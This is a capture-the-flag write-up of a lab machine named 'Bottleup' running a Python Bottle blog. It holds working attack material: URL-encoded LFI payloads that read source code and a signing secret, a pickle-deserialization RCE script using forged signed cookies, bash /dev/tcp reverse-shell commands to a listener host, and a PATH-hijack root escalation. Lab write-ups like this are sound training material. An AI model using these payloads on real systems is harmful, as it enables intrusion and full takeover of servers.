# Bottleup - Writeup

## Initial Enumeration

### Port Scanning
A basic port scan revealed only two standard services running:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http    Bottle web server (Python 3.8.10)
```

### Web Enumeration
The target was running a web application built with the Bottle Python framework. Initial exploration of the web interface showed a simple blog application.

I performed directory enumeration to identify potential attack vectors:
```bash
feroxbuster -u http://192.168.185.246:8080 -w /usr/share/wordlists/dirb/common.txt
```

This revealed several endpoints, including a potentially vulnerable `/view` endpoint.

## Gaining Initial Access

### Local File Inclusion Vulnerability
I discovered that the `/view` endpoint was vulnerable to Local File Inclusion (LFI):
```
http://192.168.185.246:8080/view?page=%252e%252e%252f%252e%252e%252f%2Fproc%2Fself%2Fenviron
```

This vulnerability allowed me to read system files. I used it to identify the application's execution directory:
```
http://192.168.185.246:8080/view?page=%252e%252e%252f%252e%252e%252f%252fopt%252fbottle-blog%252fapp.py
```

### Application Source Code Disclosure
The LFI vulnerability exposed the application's source code:
```python
from bottle import route, run, static_file,template,request,response,error
from config.secret import secret 
import os 
import urllib
import re
@route("/")
def home():
    session = request.get_cookie('name',secret=secret)
    if (not session):
        session={"name":"guest"}
        response.set_cookie('name',session,secret=secret)

    return template('index',name=session['name'])

@route('/static/js/<filename>')
def server_static(filename):
    return static_file(filename, root=os.getcwd()+'/views/js/')

@route('/static/css/<filename>')
def server_static(filename):
    return static_file(filename, root=os.getcwd()+'/views/css/')
```

I also discovered the application's secret key used for cookie signing:
```
http://192.168.185.246:8080/view?page=%252e%252e%252f%252e%252e%252f/opt/bottle-blog/config/secret.py
```

This revealed:
```python
secret = "546546DSQ7711DSQDSQXWZ"
```

### Cookie Manipulation
I created a script to generate an admin cookie:
```python
import pickle
import base64
import hmac
import hashlib

def tob(s, enc='utf8'):
    if isinstance(s, str):
        return s.encode(enc)
    return b'' if s is None else bytes(s)

def touni(s, enc='utf8', err='strict'):
    if isinstance(s, bytes):
        return s.decode(enc, err)
    return str("" if s is None else s)

def create_admin_cookie(secret):
    session = {"name": "admin"}
    d = pickle.dumps([name, session], -1)
    encoded = base64.b64encode(d)
    sig = base64.b64encode(hmac.new(tob(secret), encoded, digestmod=hashlib.md5).digest())
    return touni(tob('!') + sig + tob('?') + encoded)

cookie = create_admin_cookie("546546DSQ7711DSQDSQXWZ")
print(cookie)
```

This generated: `!tha0+wxAFQXZDPeyKFIBuw==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFYWRtaW6Uc4aULg==`

However, accessing the application with this admin cookie did not provide any additional privileges.

## Exploitation

### Python Pickle Deserialization Vulnerability
After further research, I discovered that the Bottle framework's cookie handling was vulnerable to Python Pickle deserialization attacks when using signed cookies.

I created an exploit script to leverage this vulnerability:
```python
import rich
from rich import print
from rich.console import Console
import os
import hmac
import hashlib
import base64
import pickle
import requests

def tob(s, enc='utf8'):
    if isinstance(s, str):
        return s.encode(enc)
    return b'' if s is None else bytes(s)

def touni(s, enc='utf8', err='strict'):
    if isinstance(s, bytes):
        return s.decode(enc, err)
    return str("" if s is None else s)

def create_cookie(name, value, secret):
    d = pickle.dumps([name, value], -1)
    encoded = base64.b64encode(d)
    sig = base64.b64encode(hmac.new(tob(secret), encoded, digestmod=hashlib.md5).digest())
    value = touni(tob('!') + sig + tob('?') + encoded)
    return value

class PickleRCE(object):
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (exec,(f"""
from bottle import response
import subprocess
import base64
output = subprocess.check_output('{self.cmd}', shell=True)
response.set_header('X-Flag', base64.b64encode(output))
""",))

def execute_command(cmd):
    try:
        session = {"name": PickleRCE(cmd)}
        cookie = create_cookie("name", session, "546546DSQ7711DSQDSQXWZ")
        r = requests.get("http://192.168.185.246:8080", cookies={"name": cookie})
        return base64.b64decode(r.headers["x-flag"]).decode("ascii")
    except Exception as e:
        print("Something went wrong")
        print(e)
```

Using this script, I was able to execute arbitrary commands on the server and establish a reverse shell:
```bash
python3 exploit.py "bash -c 'bash -i >& /dev/tcp/192.168.45.172/4444 0>&1'"
```

I had a listener set up to catch the connection:
```bash
nc -lvnp 4444
```

This provided initial access as the `hcue` user.

## Privilege Escalation

### System Service Enumeration
After gaining access as the `hcue` user, I enumerated the system for privilege escalation vectors:
```bash
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -not -path "/run/*" -not -path "/tmp/*" 2>/dev/null
```

I discovered two interesting systemd service files:
```
/etc/systemd/system/app.service
/etc/systemd/system/larj.service
```

Using `pspy` to monitor processes, I determined that `larj.service` was executing a script `/opt/larj.sh` as root every 60 seconds.

### Script Analysis
I examined the contents of `/opt/larj.sh`:
```bash
#!/bin/bash

##### Developed by Intern Team Members - 
##### 2022-2023 Project

echo -e "
#####################################################################
    CPU Health Check Report
#####################################################################
 
 
Hostname         : `hostname`
Kernel Version   : `uname -r`
Uptime           : `uptime | sed 's/.*up \([^,]*\), .*/\1/'`
Last Reboot Time : `who -b | awk '{print $3,$4}'`
 
 
 
*********************************************************************
CPU Load - > Threshold < 1 Normal > 1 Caution , > 2 Unhealthy 
*********************************************************************
" > /root/status.log

LSCPU=`which lscpu`
LSCPU=$?
if [ $LSCPU != 0 ]
then
    RESULT=$RESULT" lscpu required to producre acqurate reults"
else
cpus=`lscpu | grep -e "^CPU(s):" | cut -f2 -d: | awk '{print $1}'`
i=0
while [ $i -lt $cpus ]
do
    echo "CPU$i : `mpstats -P ALL | awk -v var=$i '{ if ($3 == var ) print $4 }' `" >> /root/status.log
    let i=$i+1
done
fi

echo -e "
Load Average   : `uptime | awk -F'load average:' '{ print $2 }' | cut -f1 -d,`
 
Heath Status : `uptime | awk -F'load average:' '{ print $2 }' | cut -f1 -d, | awk '{if ($1 > 2) print "Unhealthy"; else if ($1 > 1) print "Caution"; else print "Normal"}'`
" >> /root/status.log
```

I noticed that the script was attempting to execute a command called `mpstats`, which did not exist on the system.

### PATH Hijacking
I checked the `$PATH` environment variable:
```bash
echo $PATH
/usr/bin:/usr/local/bin:/home/hcue:/home/root:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin
```

Since the user's home directory was included in the `$PATH`, I could create a malicious `mpstats` binary there:
```bash
cd /home/hcue
echo '#!/bin/bash' > mpstats
echo 'bash -i >& /dev/tcp/192.168.45.172/5555 0>&1' >> mpstats
chmod +x mpstats
```

I set up another listener:
```bash
nc -lvnp 5555
```

After waiting for the cron job to execute (approximately 60 seconds), I received a reverse shell as the root user, successfully completing the privilege escalation.